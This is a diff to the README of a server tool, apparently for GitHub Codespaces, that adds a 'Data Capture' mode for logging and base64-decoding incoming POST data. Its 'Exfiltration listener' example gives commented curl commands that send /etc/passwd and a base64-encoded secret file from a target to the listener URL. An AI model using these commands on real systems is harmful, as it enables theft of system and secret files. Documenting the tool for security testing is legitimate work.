@@ -66,6 +66,35 @@ cs-serve custom 9999 '<html><body>test</body></html>' text/html
 cs-serve custom 9999 '<?xml version="1.0"?><root/>' application/xml 201
 ```
 
+## Data Capture
+
+Capture incoming POST data with automatic base64 detection and decoding:
+
+```bash
+cs-serve capture
+cs-serve capture 8080
+```
+
+Any POST, PUT, or PATCH request to any path is captured. The server:
+
+- Logs each capture with headers, client IP, and a content preview
+- Auto-detects base64 payloads and decodes them inline
+- Saves raw data as `capture_NNN.bin` and decoded data as `capture_NNN.decoded`
+- Downloads all captures to your current directory on `Ctrl+C`
+
+### Example: Exfiltration listener
+
+```bash
+# Start the capture server
+cs-serve capture
+
+# On the target, exfiltrate data:
+# curl -X POST -d @/etc/passwd https://<codespace>-9999.app.github.dev/
+# cat secret.txt | base64 | curl -X POST -d @- https://<codespace>-9999.app.github.dev/
+
+# Press Ctrl+C to stop and download all captures locally
+```
+
 ## Real-Time Logging
 
 All servers log incoming requests to stdout in real time. This is useful for:
